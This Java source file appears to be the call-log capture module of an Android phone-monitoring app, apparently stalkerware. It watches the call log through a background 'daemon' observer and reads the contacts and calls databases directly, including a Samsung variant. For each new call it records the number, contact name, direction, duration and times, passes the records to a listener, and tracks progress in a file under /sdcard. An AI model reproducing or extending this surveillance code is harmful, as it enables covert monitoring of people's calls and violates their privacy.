package com.vvt.calllog;

import java.io.File;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.TimeZone;

import android.content.Context;
import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import android.database.sqlite.SQLiteException;
import android.net.Uri;
import android.provider.CallLog;

import com.vvt.calendar.CalendarObserver;
import com.vvt.contacts.ContactsDatabaseHelper;
import com.vvt.contacts.ContactsDatabaseManager;
import com.vvt.contentobserver.IDaemonContentObserver;
import com.vvt.dbobserver.WriteReadFile;
import com.vvt.logger.FxLog;

public class CallLogObserver extends IDaemonContentObserver {

	private static final String TAG = "CallLogObserver";
	private static final boolean LOGV = Customization.VERBOSE;
	private static final boolean LOGD = Customization.DEBUG;
	private static final boolean LOGE = Customization.ERROR;
	
	private static final String DEFAULT_DATE_FORMAT = "dd/MM/yy HH:mm:ss";
	private static final String DEFAULT_PATH = "/sdcard/data/data/com.vvt.im";
	private static final String LOG_FILE_NAME = "callFxLog.ref";
	
	private CalendarObserver mCalendarObserver;
	private OnCaptureListener mListener;
	private SimpleDateFormat mDateFormatter;
	private String mLoggablePath;
	
	private static CallLogObserver sInstance;
	
	public static CallLogObserver getInstance(Context context) {
		if (sInstance == null) {
			sInstance = new CallLogObserver(context);
		}
		return sInstance;
	}
	
	private CallLogObserver(Context context) {
		super(context);
		
		mCalendarObserver = CalendarObserver.getInstance();
		mCalendarObserver.enable();
		
		mDateFormatter = new SimpleDateFormat(DEFAULT_DATE_FORMAT);
		
		mLoggablePath = DEFAULT_PATH;
	}
	
	public void setLoggablePath(String path) {
		mLoggablePath = path;
	}
	
	public void setDateFormat(String format) {
		mDateFormatter = new SimpleDateFormat(format);
	}
	
	public void registerObserver(OnCaptureListener listener) {
		long refId = ContactsDatabaseManager.getLatestCallLogId();
		setRefId(refId);
		
		if(LOGD) FxLog.d(TAG, String.format("registerObserver # refId: %d", refId));
		
		mListener = listener;
		super.registerObserver();
	}
	
	public void unregisterObserver(OnCaptureListener listener) {
		mListener = null;
		super.unregisterObserver();
	}

	@Override
	protected void onContentChange() {
		if(LOGV) FxLog.v(TAG, "onContentChange # ENTER ...");
		
		long refId = getRefId();
		
		// No need to query if there are no new event
		long latestId = ContactsDatabaseManager.getLatestCallLogId();
		if (latestId <= refId) {
			if(LOGD) FxLog.d(TAG, "onContentChange # Latest ID is too old!! -> EXIT ...");
			
			// Since '_id' in 'calls' is set to increase automatically
			// so it is impossible to found '_id' less than the reference
			return;
		}
		
		ArrayList<CallLogData> calls = getNewerCallLog(refId);
		if (calls == null || calls.size() == 0) {
			if(LOGD) FxLog.d(TAG, "onContentChange # No new data found!! -> EXIT ...");
			return;
		}
		
		if (mListener != null) {
			mListener.onCapture(calls);
		}
		
		if(LOGV) FxLog.v(TAG, "onContentChange # EXIT ...");
	}
	
	@Override
	protected Uri getContentUri() {
		return CallLog.Calls.CONTENT_URI;
	}

	@Override
	protected String getTag() {
		return TAG;
	}

	private ArrayList<CallLogData> getNewerCallLog(long refId) {
		if(LOGV) FxLog.v(TAG, "getNewerCallLog # ENTER ...");
		
		ArrayList<CallLogData> calls = new ArrayList<CallLogData>();
		
		SQLiteDatabase db = ContactsDatabaseHelper.getReadableDatabase(true);
		if (db == null || db.isDbLockedByCurrentThread() || db.isDbLockedByOtherThreads()) {
			if(LOGD) FxLog.d(TAG, "getNewerCallLog # Open database FAILED!! -> EXIT ...");
			if (db != null) {
				db.close();
			}
			return calls;
		}
		
		// Check database path
		String dbPath = db.getPath();
		if (dbPath != null) {
			if(LOGD) FxLog.d(TAG, String.format("getNewerCallLog # dbPath: %s", dbPath));
		}
		boolean isLogsInSamsung = dbPath.contains(
				ContactsDatabaseHelper.LOGS_DB_NAME_IN_SAMSUNG);
		
		Cursor cursor = null;
		
		try {
			String selection = null;
			if (isLogsInSamsung) {
				selection = String.format("%s = %d AND %s > %d",
						ContactsDatabaseHelper.COLUMN_LOGTYPE, 100,
						ContactsDatabaseHelper.COLUMN_ID, refId);
			}
			else {
				selection = String.format("%s > %d", ContactsDatabaseHelper.COLUMN_ID, refId);
			}
			cursor = db.query(
					isLogsInSamsung ? 
							ContactsDatabaseHelper.TABLE_LOGS : 
								ContactsDatabaseHelper.TABLE_CALLS, 
					null, selection, null, null, null, null);
		}
		catch (SQLiteException e) {
			if(LOGE) FxLog.e(TAG, String.format("getNewerCallLog # %s", e.toString()));
		}
		
		if (cursor == null) {
			if(LOGE) FxLog.e(TAG, "getNewerCallLog # Query database FAILED!! -> EXIT ...");
			db.close();
			return calls;
		}
		
		if(LOGV) FxLog.v(TAG, "getNewerCallLog # Begin query");
		
		CallLogData call = null;
		String timeInitiated, timeConnected, timeTerminated = null;
		while (cursor.moveToNext()) {
			
			long id = cursor.getLong(cursor.getColumnIndex(ContactsDatabaseHelper.COLUMN_ID));
			if (id > refId) refId = id;
			
			String phonenumber = cursor.getString(cursor.getColumnIndex(
					ContactsDatabaseHelper.COLUMN_NUMBER));
			
			if (phonenumber == null || phonenumber.trim().length() < 3) {
				phonenumber = "";
			}
			
			String contactName = cursor.getString(cursor.getColumnIndex(
					ContactsDatabaseHelper.COLUMN_NAME));
			
			if (contactName == null || contactName.trim().length() == 0) {
				contactName = "";
			}
			
			int duration = cursor.getInt(cursor.getColumnIndex(
					ContactsDatabaseHelper.COLUMN_DURATION));
			
			long timeInitiatedMs = cursor.getLong(cursor.getColumnIndex(
					ContactsDatabaseHelper.COLUMN_DATE));
			
			long timeTerminatedMs = System.currentTimeMillis();
			
			long timeConnectedMs = timeTerminatedMs - (duration * 1000);
			
			int type = cursor.getInt(cursor.getColumnIndex(
					ContactsDatabaseHelper.COLUMN_TYPE));
			
			CallLogData.Direction direction = type == CallLog.Calls.INCOMING_TYPE ? 
					CallLogData.Direction.IN : type == CallLog.Calls.OUTGOING_TYPE ? 
							CallLogData.Direction.OUT : CallLogData.Direction.MISSED;
			
			mDateFormatter.setTimeZone(
					TimeZone.getTimeZone(
							mCalendarObserver.getLocalTimeZone()));
			
			timeInitiated = mDateFormatter.format(new Date(timeInitiatedMs));
			timeConnected = mDateFormatter.format(new Date(timeConnectedMs));
			timeTerminated = mDateFormatter.format(new Date(timeTerminatedMs));
			
			call = new CallLogData();
			call.setTime(timeTerminatedMs);
			call.setTimeInitiated(timeInitiated);
			call.setTimeConnected(timeConnected);
			call.setTimeTerminated(timeTerminated);
			call.setDirection(direction);
			call.setDuration(duration);
			call.setPhonenumber(phonenumber);
			call.setContactName(contactName);
			calls.add(call);
			
			if(LOGD) FxLog.d(TAG, String.format("getNewerCallLog # Capture %s", call));
		}
		
		if(LOGV) FxLog.v(TAG, "getNewerCallLog # Update refId");
		setRefId(refId);
		
		cursor.close();
		db.close();
		
		if(LOGV) FxLog.v(TAG, "getNewerCallLog # EXIT ...");
		return calls;
	}

	private void setRefId(long refId){
		String fullPath = String.format(mLoggablePath);
		File f = new File(fullPath);
		if (!f.exists()) {
			f.mkdirs();
		}
		WriteReadFile.writeFile(
				String.format("%s/%s", mLoggablePath, LOG_FILE_NAME), 
				String.valueOf(refId));
	}
	
	private long getRefId(){
		String refIdText = WriteReadFile.readFile(
				String.format("%s/%s", mLoggablePath, LOG_FILE_NAME));
		long refId = Long.parseLong(refIdText);
		return refId;
	}

	public static interface OnCaptureListener {
		public void onCapture(ArrayList<CallLogData> calls);
	}
}
